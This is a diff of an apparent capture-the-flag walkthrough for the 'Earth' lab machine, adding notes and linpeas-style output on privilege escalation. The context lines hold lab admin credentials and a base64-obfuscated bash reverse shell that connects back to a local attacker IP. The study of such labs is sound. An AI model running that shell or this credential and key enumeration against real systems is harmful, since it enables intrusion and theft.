@@ -194,3 +194,61 @@ earth.local/admin credentials: `terra:earthclimatechangebad4humans`
 ```
 echo -e 'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI2LzEzMzcgMD4mMQo=' | base64 -d | bash
 ```
+
+PLACE SCREENSHOT HERE FOR PROOF
+
+## Privilege Escalation
+
+### Manual Enumeration
+
+* Nothing internal is running weird
+
+```
+Sudo version 1.9.5p2
+
+```
+
+### Automated Enumeration
+
+* gcc was found /usr/bin/gcc
+
+```
+══╣ Some certificates were found (out limited):
+/etc/pki/ca-trust/extracted/pem/objsign-ca-bundle.pem
+/etc/pki/ca-trust/source/ca-bundle.legacy.crt
+/etc/pki/tls/certs/localhost.crt
+/etc/ssl/earth.local.crt
+1525PSTORAGE_CERTSBIN
+
+passwd file: /var/lib/sss/mc/passwd
+
+-rw-r--r--. 1 root root 475 Jun 30  2021 /usr/lib/firewalld/services/vnc-server.xml
+
+-rwsr-xr-x. 1 root root 24K Oct 12  2021 /usr/bin/reset_root (Unknown SUID binary!)
+-rwsr-xr-x. 1 root root 16K Sep 29  2021 /usr/sbin/grub2-set-bootflag (Unknown SUID binary!)
+
+/var/earth_web/db.sqlite3
+
+/etc/selinux/.config_backup
+/etc/authselect/user-nsswitch.conf.bak
+
+ -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
+ -> Extracting tables from /var/earth_web/db.sqlite3 (limit 20)
+ -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
+ -> Extracting tables from /var/lib/dnf/history.sqlite (limit 20)
+ -> Extracting tables from /var/lib/rpm/rpmdb.sqlite (limit 20)
+ 
+ /etc/authselect/password-auth
+/etc/pam.d/password-auth
+/etc/pki/tls/private/localhost.key
+/etc/ssh/earth.local.key
+/etc/trusted-key.key
+/etc/unbound/root.key
+/usr/bin/systemd-ask-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/bin/tpm2_activatecredential
+/usr/bin/tpm2_makecredential
+
+/var/lib/unbound/root.key
+```
